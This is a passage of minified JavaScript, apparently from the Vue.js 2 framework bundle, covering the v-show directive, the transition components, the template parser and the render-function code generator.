e?e._value:e.value}function qi(e){e.target.composing=!0}function Xi(e){e.target.composing&&(e.target.composing=!1,Yi(e.target,"input"))}function Yi(e,t){var n=document.createEvent("HTMLEvents");n.initEvent(t,!0,!0),e.dispatchEvent(n)}function Ji(e){return!e.componentInstance||e.data&&e.data.transition?e:Ji(e.componentInstance._vnode)}var Zi={model:Vi,show:{bind:function(e,t,n){var r=t.value,i=(n=Ji(n)).data&&n.data.transition,a=e.__vOriginalDisplay="none"===e.style.display?"":e.style.display;r&&i?(n.data.show=!0,Ri(n,(function(){e.style.display=a}))):e.style.display=r?a:"none"},update:function(e,t,n){var r=t.value;!r!=!t.oldValue&&((n=Ji(n)).data&&n.data.transition?(n.data.show=!0,r?Ri(n,(function(){e.style.display=e.__vOriginalDisplay})):ji(n,(function(){e.style.display="none"}))):e.style.display=r?e.__vOriginalDisplay:"none")},unbind:function(e,t,n,r,i){i||(e.style.display=e.__vOriginalDisplay)}}},ea={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function ta(e){var t=e&&e.componentOptions;return t&&t.Ctor.options.abstract?ta(Vt(t.children)):e}function na(e){var t={},n=e.$options;for(var r in n.propsData)t[r]=e[r];var i=n._parentListeners;for(var a in i)t[C(a)]=i[a];return t}function ra(e,t){if(/\d-keep-alive$/.test(t.tag))return e("keep-alive",{props:t.componentOptions.propsData})}var ia=function(e){return e.tag||Ht(e)},aa=function(e){return"show"===e.name},oa={name:"transition",props:ea,abstract:!0,render:function(e){var t,n,r=this,i=this.$slots.default;if(i&&(i=i.filter(ia)).length){var a=this.mode,o=i[0];if(function(e){for(;e=e.parent;)if(e.data.transition)return!0}(this.$vnode))return o;var l=ta(o);if(!l)return o;if(this._leaving)return ra(e,o);var c="__transition-"+this._uid+"-";l.key=null==l.key?l.isComment?c+"comment":c+l.tag:s(l.key)?0===String(l.key).indexOf(c)?l.key:c+l.key:l.key;var u=(l.data||(l.data={})).transition=na(this),d=this._vnode,p=ta(d);if(l.data.directives&&l.data.directives.some(aa)&&(l.data.show=!0),p&&p.data&&(t=l,(n=p).key!==t.key||n.tag!==t.tag)&&!Ht(p)&&(!p.componentInstance||!p.componentInstance._vnode.isComment)){var h=p.data.transition=E({},u);if("out-in"===a)return this._leaving=!0,st(h,"afterLeave",(function(){r._leaving=!1,r.$forceUpdate()})),ra(e,o);if("in-out"===a){if(Ht(l))return d;var f,A=function(){f()};st(u,"afterEnter",A),st(u,"enterCancelled",A),st(h,"delayLeave",(function(e){f=e}))}}return o}}},sa=E({tag:String,moveClass:String},ea);function la(e){e.elm._moveCb&&e.elm._moveCb(),e.elm._enterCb&&e.elm._enterCb()}function ca(e){e.data.newPos=e.elm.getBoundingClientRect()}function ua(e){var t=e.data.pos,n=e.data.newPos,r=t.left-n.left,i=t.top-n.top;if(r||i){e.data.moved=!0;var a=e.elm.style;a.transform=a.WebkitTransform="translate("+r+"px,"+i+"px)",a.transitionDuration="0s"}}delete sa.mode;var da={Transition:oa,TransitionGroup:{props:sa,beforeMount:function(){var e=this,t=this._update;this._update=function(n,r){var i=Xt(e);e.__patch__(e._vnode,e.kept,!1,!0),e._vnode=e.kept,i(),t.call(e,n,r)}},render:function(e){for(var t=this.tag||this.$vnode.data.tag||"span",n=Object.create(null),r=this.prevChildren=this.children,i=this.$slots.default||[],a=this.children=[],o=na(this),s=0;s<i.length;s++){var l=i[s];l.tag&&null!=l.key&&0!==String(l.key).indexOf("__vlist")&&(a.push(l),((n[l.key]=l).data||(l.data={})).transition=o)}if(r){for(var c=[],u=[],d=0;d<r.length;d++){var p=r[d];p.data.transition=o,p.data.pos=p.elm.getBoundingClientRect(),n[p.key]?c.push(p):u.push(p)}this.kept=e(t,null,c),this.removed=u}return e(t,null,a)},updated:function(){var e=this.prevChildren,t=this.moveClass||(this.name||"v")+"-move";e.length&&this.hasMove(e[0].elm,t)&&(e.forEach(la),e.forEach(ca),e.forEach(ua),this._reflow=document.body.offsetHeight,e.forEach((function(e){if(e.data.moved){var n=e.elm,r=n.style;Pi(n,t),r.transform=r.WebkitTransform=r.transitionDuration="",n.addEventListener(ki,n._moveCb=function e(r){r&&r.target!==n||r&&!/transform$/.test(r.propertyName)||(n.removeEventListener(ki,e),n._moveCb=null,Ii(n,t))})}})))},methods:{hasMove:function(e,t){if(!wi)return!1;if(this._hasMove)return this._hasMove;var n=e.cloneNode();e._transitionClasses&&e._transitionClasses.forEach((function(e){yi(n,e)})),gi(n,t),n.style.display="none",this.$el.appendChild(n);var r=Oi(n);return this.$el.removeChild(n),this._hasMove=r.hasTransform}}}};Mn.config.mustUseProp=jn,Mn.config.isReservedTag=Zn,Mn.config.isReservedAttr=Dn,Mn.config.getTagNamespace=er,Mn.config.isUnknownElement=function(e){if(!G)return!0;if(Zn(e))return!1;if(e=e.toLowerCase(),null!=tr[e])return tr[e];var t=document.createElement(e);return-1<e.indexOf("-")?tr[e]=t.constructor===window.HTMLUnknownElement||t.constructor===window.HTMLElement:tr[e]=/HTMLUnknownElement/.test(t.toString())},E(Mn.options.directives,Zi),E(Mn.options.components,da),Mn.prototype.__patch__=G?Hi:P,Mn.prototype.$mount=function(e,t){return n=this,r=e=e&&G?rr(e):void 0,i=t,n.$el=r,n.$options.render||(n.$options.render=ve),Zt(n,"beforeMount"),new pn(n,(function(){n._update(n._render(),i)}),P,{before:function(){n._isMounted&&!n._isDestroyed&&Zt(n,"beforeUpdate")}},!0),i=!1,null==n.$vnode&&(n._isMounted=!0,Zt(n,"mounted")),n;var n,r,i},G&&setTimeout((function(){U.devtools&&ae&&ae.emit("init",Mn)}),0);var pa,ha,fa,Aa,ma,va,ga,ya,ba,_a=/\{\{((?:.|\r?\n)+?)\}\}/g,wa=/[-.*+?^${}()|[\]\/\\]/g,Ca=_((function(e){var t=e[0].replace(wa,"\\$&"),n=e[1].replace(wa,"\\$&");return new RegExp(t+"((?:.|\\n)+?)"+n,"g")})),xa={staticKeys:["staticClass"],transformNode:function(e,t){t.warn;var n=$r(e,"class");n&&(e.staticClass=JSON.stringify(n));var r=Ur(e,"class",!1);r&&(e.classBinding=r)},genData:function(e){var t="";return e.staticClass&&(t+="staticClass:"+e.staticClass+","),e.classBinding&&(t+="class:"+e.classBinding+","),t}},Sa={staticKeys:["staticStyle"],transformNode:function(e,t){t.warn;var n=$r(e,"style");n&&(e.staticStyle=JSON.stringify(oi(n)));var r=Ur(e,"style",!1);r&&(e.styleBinding=r)},genData:function(e){var t="";return e.staticStyle&&(t+="staticStyle:"+e.staticStyle+","),e.styleBinding&&(t+="style:("+e.styleBinding+"),"),t}},ka=A("area,base,br,col,embed,frame,hr,img,input,isindex,keygen,link,meta,param,source,track,wbr"),Ma=A("colgroup,dd,dt,li,options,p,td,tfoot,th,thead,tr,source"),Ba=A("address,article,aside,base,blockquote,body,caption,col,colgroup,dd,details,dialog,div,dl,dt,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,head,header,hgroup,hr,html,legend,li,menuitem,meta,optgroup,option,param,rp,rt,source,style,summary,tbody,td,tfoot,th,thead,title,tr,track"),Ea=/^\s*([^\s"'<>\/=]+)(?:\s*(=)\s*(?:"([^"]*)"+|'([^']*)'+|([^\s"'=<>`]+)))?/,Ta=/^\s*((?:v-[\w-]+:|@|:|#)\[[^=]+\][^\s"'<>\/=]*)(?:\s*(=)\s*(?:"([^"]*)"+|'([^']*)'+|([^\s"'=<>`]+)))?/,Pa="[a-zA-Z_][\\-\\.0-9_a-zA-Z"+$.source+"]*",Ia="((?:"+Pa+"\\:)?"+Pa+")",Fa=new RegExp("^<"+Ia),La=/^\s*(\/?)>/,Oa=new RegExp("^<\\/"+Ia+"[^>]*>"),Na=/^<!DOCTYPE [^>]+>/i,Da=/^<!\--/,Ra=/^<!\[/,ja=A("script,style,textarea",!0),Ua={},$a={"&lt;":"<","&gt;":">","&quot;":'"',"&amp;":"&","&#10;":"\n","&#9;":"\t","&#39;":"'"},za=/&(?:lt|gt|quot|amp|#39);/g,Ha=/&(?:lt|gt|quot|amp|#39|#10|#9);/g,Va=A("pre,textarea",!0),Qa=function(e,t){return e&&Va(e)&&"\n"===t[0]},Ga=/^@|^v-on:/,Wa=/^v-|^@|^:|^#/,Ka=/([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/,qa=/,([^,\}\]]*)(?:,([^,\}\]]*))?$/,Xa=/^\(|\)$/g,Ya=/^\[.*\]$/,Ja=/:(.*)$/,Za=/^:|^\.|^v-bind:/,eo=/\.[^.\]]+(?=[^\]]*$)/g,to=/^v-slot(:|$)|^#/,no=/[\r\n]/,ro=/\s+/g,io=_((function(e){return(pa=pa||document.createElement("div")).innerHTML=e,pa.textContent})),ao="_empty_";function oo(e,t,n){return{type:1,tag:e,attrsList:t,attrsMap:function(e){for(var t={},n=0,r=e.length;n<r;n++)t[e[n].name]=e[n].value;return t}(t),rawAttrsMap:{},parent:n,children:[]}}function so(e,t){var n,r,i,a,o,s,l;(r=Ur(n=e,"key"))&&(n.key=r),e.plain=!e.key&&!e.scopedSlots&&!e.attrsList.length,(l=Ur(s=e,"ref"))&&(s.ref=l,s.refInFor=function(e){for(var t=s;t;){if(void 0!==t.for)return!0;t=t.parent}return!1}()),function(e){var t;"template"===e.tag?(t=$r(e,"scope"),e.slotScope=t||$r(e,"slot-scope")):(t=$r(e,"slot-scope"))&&(e.slotScope=t);var n,r=Ur(e,"slot");if(r&&(e.slotTarget='""'===r?'"default"':r,e.slotTargetDynamic=!(!e.attrsMap[":slot"]&&!e.attrsMap["v-bind:slot"]),"template"===e.tag||e.slotScope||Nr(e,"slot",r,(n=e).rawAttrsMap[":slot"]||n.rawAttrsMap["v-bind:slot"]||n.rawAttrsMap.slot)),"template"===e.tag){var i=zr(e,to);if(i){var a=uo(i),o=a.name,s=a.dynamic;e.slotTarget=o,e.slotTargetDynamic=s,e.slotScope=i.value||ao}}else{var l=zr(e,to);if(l){var c=e.scopedSlots||(e.scopedSlots={}),u=uo(l),d=u.name,p=u.dynamic,h=c[d]=oo("template",[],e);h.slotTarget=d,h.slotTargetDynamic=p,h.children=e.children.filter((function(e){if(!e.slotScope)return e.parent=h,!0})),h.slotScope=l.value||ao,e.children=[],e.plain=!1}}}(e),"slot"===(o=e).tag&&(o.slotName=Ur(o,"name")),(a=Ur(i=e,"is"))&&(i.component=a),null!=$r(i,"inline-template")&&(i.inlineTemplate=!0);for(var c=0;c<Aa.length;c++)e=Aa[c](e,t)||e;return function(e){var t,n,r,i,a,o,s,l,c,u,d,p,h,f,A,m,v=e.attrsList;for(t=0,n=v.length;t<n;t++)if(r=i=v[t].name,a=v[t].value,Wa.test(r))if(e.hasBindings=!0,(o=po(r.replace(Wa,"")))&&(r=r.replace(eo,"")),Za.test(r))r=r.replace(Za,""),a=Pr(a),(l=Ya.test(r))&&(r=r.slice(1,-1)),o&&(o.prop&&!l&&"innerHtml"===(r=C(r))&&(r="innerHTML"),o.camel&&!l&&(r=C(r)),o.sync&&(s=Qr(a,"$event"),l?jr(e,'"update:"+('+r+")",s,null,!1,0,v[t],!0):(jr(e,"update:"+C(r),s,null,!1,0,v[t]),k(r)!==C(r)&&jr(e,"update:"+k(r),s,null,!1,0,v[t])))),o&&o.prop||!e.component&&ya(e.tag,e.attrsMap.type,r)?Or(e,r,a,v[t],l):Nr(e,r,a,v[t],l);else if(Ga.test(r))r=r.replace(Ga,""),(l=Ya.test(r))&&(r=r.slice(1,-1)),jr(e,r,a,o,!1,0,v[t],l);else{var g=(r=r.replace(Wa,"")).match(Ja),y=g&&g[1];l=!1,y&&(r=r.slice(0,-(y.length+1)),Ya.test(y)&&(y=y.slice(1,-1),l=!0)),c=e,u=r,d=i,p=a,h=y,f=l,A=o,m=v[t],(c.directives||(c.directives=[])).push(Hr({name:u,rawName:d,value:p,arg:h,isDynamicArg:f,modifiers:A},m)),c.plain=!1}else Nr(e,r,JSON.stringify(a),v[t]),!e.component&&"muted"===r&&ya(e.tag,e.attrsMap.type,r)&&Or(e,r,"true",v[t])}(e),e}function lo(e){var t;if(t=$r(e,"v-for")){var n=function(e){var n=t.match(Ka);if(n){var r={};r.for=n[2].trim();var i=n[1].trim().replace(Xa,""),a=i.match(qa);return a?(r.alias=i.replace(qa,"").trim(),r.iterator1=a[1].trim(),a[2]&&(r.iterator2=a[2].trim())):r.alias=i,r}}();n&&E(e,n)}}function co(e,t){e.ifConditions||(e.ifConditions=[]),e.ifConditions.push(t)}function uo(e){var t=e.name.replace(to,"");return t||"#"!==e.name[0]&&(t="default"),Ya.test(t)?{name:t.slice(1,-1),dynamic:!0}:{name:'"'+t+'"',dynamic:!1}}function po(e){var t=e.match(eo);if(t){var n={};return t.forEach((function(e){n[e.slice(1)]=!0})),n}}var ho=/^xmlns:NS\d+/,fo=/^NS\d+:/;function Ao(e){return oo(e.tag,e.attrsList.slice(),e.parent)}var mo,vo,go=[xa,Sa,{preTransformNode:function(e,t){if("input"===e.tag){var n,r=e.attrsMap;if(!r["v-model"])return;if((r[":type"]||r["v-bind:type"])&&(n=Ur(e,"type")),r.type||n||!r["v-bind"]||(n="("+r["v-bind"]+").type"),n){var i=$r(e,"v-if",!0),a=i?"&&("+i+")":"",o=null!=$r(e,"v-else",!0),s=$r(e,"v-else-if",!0),l=Ao(e);lo(l),Dr(l,"type","checkbox"),so(l,t),l.processed=!0,l.if="("+n+")==='checkbox'"+a,co(l,{exp:l.if,block:l});var c=Ao(e);$r(c,"v-for",!0),Dr(c,"type","radio"),so(c,t),co(l,{exp:"("+n+")==='radio'"+a,block:c});var u=Ao(e);return $r(u,"v-for",!0),Dr(u,":type",n),so(u,t),co(l,{exp:i,block:u}),o?l.else=!0:s&&(l.elseif=s),l}}}}],yo={expectHTML:!0,modules:go,directives:{model:function(e,t,n){var r,i,a,o,s,l,c,u,d,p,h,f=t.value,A=t.modifiers,m=e.tag,v=e.attrsMap.type;if(e.component)return Vr(e,f,A),!1;if("select"===m)h=f,jr(e,"change",'var $$selectedVal = Array.prototype.filter.call($event.target.options,function(o){return o.selected}).map(function(o){var val = "_value" in o ? o._value : o.value;return '+(A&&A.number?"_n(val)":"val")+"});"+" "+Qr(h,"$event.target.multiple ? $$selectedVal : $$selectedVal[0]"),null,!0);else if("input"===m&&"checkbox"===v)s=e,l=f,c=A&&A.number,u=Ur(s,"value")||"null",d=Ur(s,"true-value")||"true",p=Ur(s,"false-value")||"false",Or(s,"checked","Array.isArray("+l+")?_i("+l+","+u+")>-1"+("true"===d?":("+l+")":":_q("+l+","+d+")")),jr(s,"change","var $$a="+l+",$$el=$event.target,$$c=$$el.checked?("+d+"):("+p+");if(Array.isArray($$a)){var $$v="+(c?"_n("+u+")":u)+",$$i=_i($$a,$$v);if($$el.checked){$$i<0&&("+Qr(l,"$$a.concat([$$v])")+")}else{$$i>-1&&("+Qr(l,"$$a.slice(0,$$i).concat($$a.slice($$i+1))")+")}}else{"+Qr(l,"$$c")+"}",null,!0);else if("input"===m&&"radio"===v)r=e,i=f,a=A&&A.number,o=Ur(r,"value")||"null",Or(r,"checked","_q("+i+","+(o=a?"_n("+o+")":o)+")"),jr(r,"change",Qr(i,o),null,!0);else if("input"===m||"textarea"===m)!function(e,t,n){var r=e.attrsMap.type,i=n||{},a=i.lazy,o=i.number,s=i.trim,l=!a&&"range"!==r,c=a?"change":"range"===r?"__r":"input",u="$event.target.value";s&&(u="$event.target.value.trim()"),o&&(u="_n("+u+")");var d=Qr(t,u);l&&(d="if($event.target.composing)return;"+d),Or(e,"value","("+t+")"),jr(e,c,d,null,!0),(s||o)&&jr(e,"blur","$forceUpdate()")}(e,f,A);else if(!U.isReservedTag(m))return Vr(e,f,A),!1;return!0},text:function(e,t){t.value&&Or(e,"textContent","_s("+t.value+")",t)},html:function(e,t){t.value&&Or(e,"innerHTML","_s("+t.value+")",t)}},isPreTag:function(e){return"pre"===e},isUnaryTag:ka,mustUseProp:jn,canBeLeftOpenTag:Ma,isReservedTag:Zn,getTagNamespace:er,staticKeys:go.reduce((function(e,t){return e.concat(t.staticKeys||[])}),[]).join(",")},bo=_((function(e){return A("type,tag,attrsList,attrsMap,plain,parent,children,attrs,start,end,rawAttrsMap"+(e?","+e:""))})),_o=/^([\w$_]+|\([^)]*?\))\s*=>|^function(?:\s+[\w$]+)?\s*\(/,wo=/\([^)]*?\);*$/,Co=/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*|\['[^']*?']|\["[^"]*?"]|\[\d+]|\[[A-Za-z_$][\w$]*])*$/,xo={esc:27,tab:9,enter:13,space:32,up:38,left:37,right:39,down:40,delete:[8,46]},So={esc:["Esc","Escape"],tab:"Tab",enter:"Enter",space:[" ","Spacebar"],up:["Up","ArrowUp"],left:["Left","ArrowLeft"],right:["Right","ArrowRight"],down:["Down","ArrowDown"],delete:["Backspace","Delete","Del"]},ko=function(e){return"if("+e+")return null;"},Mo={stop:"$event.stopPropagation();",prevent:"$event.preventDefault();",self:ko("$event.target !== $event.currentTarget"),ctrl:ko("!$event.ctrlKey"),shift:ko("!$event.shiftKey"),alt:ko("!$event.altKey"),meta:ko("!$event.metaKey"),left:ko("'button' in $event && $event.button !== 0"),middle:ko("'button' in $event && $event.button !== 1"),right:ko("'button' in $event && $event.button !== 2")};function Bo(e,t){var n=t?"nativeOn:":"on:",r="",i="";for(var a in e){var o=Eo(e[a]);e[a]&&e[a].dynamic?i+=a+","+o+",":r+='"'+a+'":'+o+","}return r="{"+r.slice(0,-1)+"}",i?n+"_d("+r+",["+i.slice(0,-1)+"])":n+r}function Eo(e){if(!e)return"function(){}";if(Array.isArray(e))return"["+e.map((function(e){return Eo(e)})).join(",")+"]";var t=Co.test(e.value),n=_o.test(e.value),r=Co.test(e.value.replace(wo,""));if(e.modifiers){var i="",a="",o=[];for(var s in e.modifiers)if(Mo[s])a+=Mo[s],xo[s]&&o.push(s);else if("exact"===s){var l=e.modifiers;a+=ko(["ctrl","shift","alt","meta"].filter((function(e){return!l[e]})).map((function(e){return"$event."+e+"Key"})).join("||"))}else o.push(s);return o.length&&(i+="if(!$event.type.indexOf('key')&&"+o.map(To).join("&&")+")return null;"),a&&(i+=a),"function($event){"+i+(t?"return "+e.value+"($event)":n?"return ("+e.value+")($event)":r?"return "+e.value:e.value)+"}"}return t||n?e.value:"function($event){"+(r?"return "+e.value:e.value)+"}"}function To(e){var t=parseInt(e,10);if(t)return"$event.keyCode!=="+t;var n=xo[e],r=So[e];return"_k($event.keyCode,"+JSON.stringify(e)+","+JSON.stringify(n)+",$event.key,"+JSON.stringify(r)+")"}var Po={on:function(e,t){e.wrapListeners=function(e){return"_g("+e+","+t.value+")"}},bind:function(e,t){e.wrapData=function(n){return"_b("+n+",'"+e.tag+"',"+t.value+","+(t.modifiers&&t.modifiers.prop?"true":"false")+(t.modifiers&&t.modifiers.sync?",true":"")+")"}},cloak:P},Io=function(e){this.options=e,this.warn=e.warn||Fr,this.transforms=Lr(e.modules,"transformCode"),this.dataGenFns=Lr(e.modules,"genData"),this.directives=E(E({},Po),e.directives);var t=e.isReservedTag||I;this.maybeComponent=function(e){return!!e.component||!t(e.tag)},this.onceId=0,this.staticRenderFns=[],this.pre=!1};function Fo(e,t){var n=new Io(t);return{render:"with(this){return "+(e?Lo(e,n):'_c("div")')+"}",staticRenderFns:n.staticRenderFns}}function Lo(e,t){if(e.parent&&(e.pre=e.pre||e.parent.pre),e.staticRoot&&!e.staticProcessed)return Oo(e,t);if(e.once&&!e.onceProcessed)return No(e,t);if(e.for&&!e.forProcessed)return Ro(e,t);if(e.if&&!e.ifProcessed)return Do(e,t);if("template"!==e.tag||e.slotTarget||t.pre){if("slot"===e.tag)return d=t,h="_t("+((u=e).slotName||'"default"')+((p=zo(u,d))?","+p:""),f=u.attrs||u.dynamicAttrs?Qo((u.attrs||[]).concat(u.dynamicAttrs||[]).map((function(e){return{name:C(e.name),value:e.value,dynamic:e.dynamic}}))):null,A=u.attrsMap["v-bind"],!f&&!A||p||(h+=",null"),f&&(h+=","+f),A&&(h+=(f?"":",null")+","+A),h+")";var n;if(e.component)o=e.component,l=t,c=(s=e).inlineTemplate?null:zo(s,l,!0),n="_c("+o+","+jo(s,l)+(c?","+c:"")+")";else{var r;(!e.plain||e.pre&&t.maybeComponent(e))&&(r=jo(e,t));var i=e.inlineTemplate?null:zo(e,t,!0);n="_c('"+e.tag+"'"+(r?","+r:"")+(i?","+i:"")+")"}for(var a=0;a<t.transforms.length;a++)n=t.transforms[a](e,n);return n}var o,s,l,c,u,d,p,h,f,A;return zo(e,t)||"void 0"}function Oo(e,t){e.staticProcessed=!0;var n=t.pre;return e.pre&&(t.pre=e.pre),t.staticRenderFns.push("with(this){return "+Lo(e,t)+"}"),t.pre=n,"_m("+(t.staticRenderFns.length-1)+(e.staticInFor?",true":"")+")"}function No(e,t){if(e.onceProcessed=!0,e.if&&!e.ifProcessed)return Do(e,t);if(e.staticInFor){for(var n="",r=e.parent;r;){if(r.for){n=r.key;break}r=r.parent}return n?"_o("+Lo(e,t)+","+t.onceId+++","+n+")":Lo(e,t)}return Oo(e,t)}function Do(e,t,n,r){return e.ifProcessed=!0,function e(t,n,r,i){if(!t.length)return i||"_e()";var a=t.shift();return a.exp?"("+a.exp+")?"+o(a.block)+":"+e(t,n,r,i):""+o(a.block);function o(e){return r?r(e,n):e.once?No(e,n):Lo(e,n)}}(e.ifConditions.slice(),t,n,r)}function Ro(e,t,n,r){var i=e.for,a=e.alias,o=e.iterator1?","+e.iterator1:"",s=e.iterator2?","+e.iterator2:"";return e.forProcessed=!0,(r||"_l")+"(("+i+"),function("+a+o+s+"){return "+(n||Lo)(e,t)+"})"}function jo(e,t){var n="{",r=function(e,t){var n=e.directives;if(n){var r,i,a,o,s="directives:[",l=!1;for(r=0,i=n.length;r<i;r++){a=n[r],o=!0;var c=t.directives[a.name];c&&(o=!!c(e,a,t.warn)),o&&(l=!0,s+='{name:"'+a.name+'",rawName:"'+a.rawName+'"'+(a.value?",value:("+a.value+"),expression:"+JSON.stringify(a.value):"")+(a.arg?",arg:"+(a.isDynamicArg?a.arg:'"'+a.arg+'"'):"")+(a.modifiers?",modifiers:"+JSON.stringify(a.modifiers):"")+"},")}return l?s.slice(0,-1)+"]":void 0}}(e,t);r&&(n+=r+","),e.key&&(n+="key:"+e.key+","),e.ref&&(n+="ref:"+e.ref+","),e.refInFor&&(n+="refInFor:true,"),e.pre&&(n+="pre:true,"),e.component&&(n+='tag:"'+e.tag+'",');for(var i=0;i<t.dataGenFns.length;i++)n+=t.dataGenFns[i](e);if(e.attrs&&(n+="attrs:"+Qo(e.attrs)+","),e.props&&(n+="domProps:"+Qo(e.props)+","),e.events&&(n+=Bo(e.events,!1)+","),e.nativeEvents&&(n+=Bo(e.nativeEvents,!0)+","),e.slotTarget&&!e.slotScope&&(n+="slot:"+e.slotTarget+","),e.scopedSlots&&(n+=function(e,t,n){var r=e.for||Object.keys(t).some((function(e){var n=t[e];return n.slotTargetDynamic||n.if||n.for||Uo(n)})),i=!!e.if;if(!r)for(var a=e.parent;a;){if(a.slotScope&&a.slotScope!==ao||a.for){r=!0;break}a.if&&(i=!0),a=a.parent}var o=Object.keys(t).map((function(e){return $o(t[e],n)})).join(",");return"scopedSlots:_u(["+o+"]"+(r?",null,true":"")+(!r&&i?",null,false,"+function(e){for(var t=5381,n=e.length;n;)t=33*t^e.charCodeAt(--n);return t>>>0}(o):"")+")"}(e,e.scopedSlots,t)+","),e.model&&(n+="model:{value:"+e.model.value+",callback:"+e.model.callback+",expression:"+e.model.expression+"},"),e.inlineTemplate){var a=function(t,n){var r=e.children[0];if(r&&1===r.type){var i=Fo(r,n.options);return"inlineTemplate:{render:function(){"+i.render+"},staticRenderFns:["+i.staticRenderFns.map((function(e){return"function(){"+e+"}"})).join(",")+"]}"}}(0,t);a&&(n+=a+",")}return n=n.replace(/,$/,"")+"}",e.dynamicAttrs&&(n="_b("+n+',"'+e.tag+'",'+Qo(e.dynamicAttrs)+")"),e.wrapData&&(n=e.wrapData(n)),e.wrapListeners&&(n=e.wrapListeners(n)),n}function Uo(e){return 1===e.type&&("slot"===e.tag||e.children.some(Uo))}function $o(e,t){var n=e.attrsMap["slot-scope"];if(e.if&&!e.ifProcessed&&!n)return Do(e,t,$o,"null");if(e.for&&!e.forProcessed)return Ro(e,t,$o);var r=e.slotScope===ao?"":String(e.slotScope),i="function("+r+"){return "+("template"===e.tag?e.if&&n?"("+e.if+")?"+(zo(e,t)||"undefined")+":undefined":zo(e,t)||"undefined":Lo(e,t))+"}",a=r?"":",proxy:true";return"{key:"+(e.slotTarget||'"default"')+",fn:"+i+a+"}"}function zo(e,t,n,r,i){var a=e.children;if(a.length){var o=a[0];if(1===a.length&&o.for&&"template"!==o.tag&&"slot"!==o.tag){var s=n?t.maybeComponent(o)?",1":",0":"";return""+(r||Lo)(o,t)+s}var l=n?function(e,t){for(var n=0,r=0;r<e.length;r++){var i=e[r];if(1===i.type){if(Ho(i)||i.ifConditions&&i.ifConditions.some((function(e){return Ho(e.block)}))){n=2;break}(t(i)||i.ifConditions&&i.ifConditions.some((function(e){return t(e.block)})))&&(n=1)}}return n}(a,t.maybeComponent):0,c=i||Vo;return"["+a.map((function(e){return c(e,t)})).join(",")+"]"+(l?","+l:"")}}function Ho(e){return void 0!==e.for||"template"===e.tag||"slot"===e.tag}function Vo(e,t){return 1===e.type?Lo(e,t):3===e.type&&e.isComment?(r=e,"_e("+JSON.stringify(r.text)+")"):"_v("+(2===(n=e).type?n.expression:Go(JSON.stringify(n.text)))+")";var n,r}function Qo(e){for(var t="",n="",r=0;r<e.length;r++){var i=e[r],a=Go(i.value);i.dynamic?n+=i.name+","+a+",":t+='"'+i.name+'":'+a+","}return t="{"+t.slice(0,-1)+"}",n?"_d("+t+",["+n.slice(0,-1)+"])":t}function Go(e){return e.replace(/\u2028/g,"\\u2028").replace(/\u2029/g,"\\u2029")}function Wo(e,t){try{return new Function(e)}catch(n){return t.push({err:n,code:e}),P}}new RegExp("\\b"+"do,if,for,let,new,try,var,case,else,with,await,break,catch,class,const,super,throw,while,yield,delete,export,import,return,switch,default,extends,finally,continue,debugger,function,arguments".split(",").join("\\b|\\b")+"\\b");var Ko,qo,Xo=(Ko=function(e,t){var n,r,i=function(e,t){ha=t.warn||Fr,ga=t.isPreTag||I,ya=t.mustUseProp||I,ba=t.getTagNamespace||I,t.isReservedTag,Aa=Lr(t.modules,"transformNode"),ma=Lr(t.modules,"preTransformNode"),va=Lr(t.modules,"postTransformNode"),fa=t.delimiters;var n,r,i=[],a=!1!==t.preserveWhitespace,o=t.whitespace,s=!1,l=!1;function c(e){if(u(e),s||e.processed||(e=so(e,t)),i.length||e===n||n.if&&(e.elseif||e.else)&&co(n,{exp:e.elseif,block:e}),r&&!e.forbidden)if(e.elseif||e.else)o=e,(c=function(e){for(var t=e.length;t--;){if(1===e[t].type)return e[t];e.pop()}}(r.children))&&c.if&&co(c,{exp:o.elseif,block:o});else{if(e.slotScope){var a=e.slotTarget||'"default"';(r.scopedSlots||(r.scopedSlots={}))[a]=e}r.children.push(e),e.parent=r}var o,c;e.children=e.children.filter((function(e){return!e.slotScope})),u(e),e.pre&&(s=!1),ga(e.tag)&&(l=!1);for(var d=0;d<va.length;d++)va[d](e,t)}function u(e){if(!l)for(var t;(t=e.children[e.children.length-1])&&3===t.type&&" "===t.text;)e.children.pop()}return function(e,t){for(var n,r,i=[],a=t.expectHTML,o=t.isUnaryTag||I,s=t.canBeLeftOpenTag||I,l=0;e;){if(n=e,r&&ja(r)){var c=0,u=r.toLowerCase(),d=Ua[u]||(Ua[u]=new RegExp("([\\s\\S]*?)(</"+u+"[^>]*>)","i")),p=e.replace(d,(function(e,n,r){return c=r.length,ja(u)||"noscript"===u||(n=n.replace(/<!\--([\s\S]*?)-->/g,"$1").replace(/<!\[CDATA\[([\s\S]*?)]]>/g,"$1")),Qa(u,n)&&(n=n.slice(1)),t.chars&&t.chars(n),""}));l+=e.length-p.length,e=p,k(u,l-c,l)}else{var h=e.indexOf("<");if(0===h){if(Da.test(e)){var f=e.indexOf("--\x3e");if(0<=f){t.shouldKeepComment&&t.comment(e.substring(4,f),l,l+f+3),C(f+3);continue}}if(Ra.test(e)){var A=e.indexOf("]>");if(0<=A){C(A+2);continue}}var m=e.match(Na);if(m){C(m[0].length);continue}var v=e.match(Oa);if(v){var g=l;C(v[0].length),k(v[1],g,l);continue}var y=x();if(y){S(y),Qa(y.tagName,e)&&C(1);continue}}var b=void 0,_=void 0,w=void 0;if(0<=h){for(_=e.slice(h);!(Oa.test(_)||Fa.test(_)||Da.test(_)||Ra.test(_)||(w=_.indexOf("<",1))<0);)h+=w,_=e.slice(h);b=e.substring(0,h)}h<0&&(b=e),b&&C(b.length),t.chars&&b&&t.chars(b,l-b.length,l)}if(e===n){t.chars&&t.chars(e);break}}function C(t){l+=t,e=e.substring(t)}function x(){var t=e.match(Fa);if(t){var n,r,i={tagName:t[1],attrs:[],start:l};for(C(t[0].length);!(n=e.match(La))&&(r=e.match(Ta)||e.match(Ea));)r.start=l,C(r[0].length),r.end=l,i.attrs.push(r);if(n)return i.unarySlash=n[1],C(n[0].length),i.end=l,i}}function S(e){var n,l,c,u=e.tagName,d=e.unarySlash;a&&("p"===r&&Ba(u)&&k(r),s(u)&&r===u&&k(u));for(var p=o(u)||!!d,h=e.attrs.length,f=new Array(h),A=0;A<h;A++){var 